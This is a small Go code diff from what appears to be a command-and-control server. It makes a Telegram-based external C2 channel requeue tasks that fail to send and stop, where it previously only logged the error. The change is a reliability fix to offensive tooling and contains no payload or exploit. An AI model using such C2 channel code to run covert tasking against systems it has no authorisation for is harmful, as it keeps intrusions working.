@@ -113,13 +113,15 @@ func (t *TelegramExternalC2) connectAndRun(channelID string) {
 			tasks := t.server.extC2TaskQueue[channelID]
 			t.server.extC2TaskQueue[channelID] = nil
 			t.server.extC2TaskMu.Unlock()
-			for _, task := range tasks {
+			for i, task := range tasks {
 				taskJSON, ok := marshalJSONSafe(task)
 				if !ok {
 					continue
 				}
 				if err := t.sendMessage(string(taskJSON)); err != nil {
-					slog.Error("Telegram External C2 send failed", "error", err)
+					slog.Error("Telegram External C2 send failed, requeueing", "error", err)
+					t.server.requeueExtC2Tasks(channelID, tasks[i:])
+					break
 				}
 			}
 		}
